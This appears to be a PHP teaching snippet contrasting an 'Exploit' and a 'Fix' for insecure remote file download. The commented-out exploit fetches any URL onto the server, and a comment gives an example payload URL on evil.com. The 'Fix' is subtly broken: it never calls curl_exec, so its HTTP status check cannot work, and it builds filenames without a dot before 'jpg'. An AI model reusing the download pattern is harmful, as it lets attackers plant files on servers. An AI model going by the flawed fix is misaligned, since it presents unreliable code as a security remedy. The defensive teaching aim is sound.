<?php
/* Exploit */
// $image = 'https://www.google.com/images/srpr/logo11w.png';
// $image = 'http://www.php.net/index.php';

// // hacker could download any file from any server into the filesytem
// // example: $image = 'http://www.evil.com/evil.py';

// $filename = explode('/', $image);
// $filename = array_pop($filename);
// $imagedata = file_get_contents($image);
// file_put_contents('remote_' . $filename, $imagedata);

/* Fix */
error_reporting(0);

$image = '450_jhgfasd54as76d5ashgfeke32g4'; // not 32 chars so should get 'File could not be found'
$image = '450_asdf123456gsfdrevcbht72kjsvasjks'; // passes white list validation so should get 'File not present'
$pattern = '/^[0-9]+_[0-9a-z]{32}$/';

if (!preg_match($pattern, $image)) {
    die('File could not be found');
}

$filename = $image .'jpg';
$image = 'http://www.api.com/images/fgr/' . $filename;

$ch = curl_init($image);
curl_setopt($ch, CURLOPT_NOBODY, true);
$retcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($retcode != 200) {
    die('File not present');
}

$imagedata = file_get_contents($image);
file_put_contents($filename, $imagedata);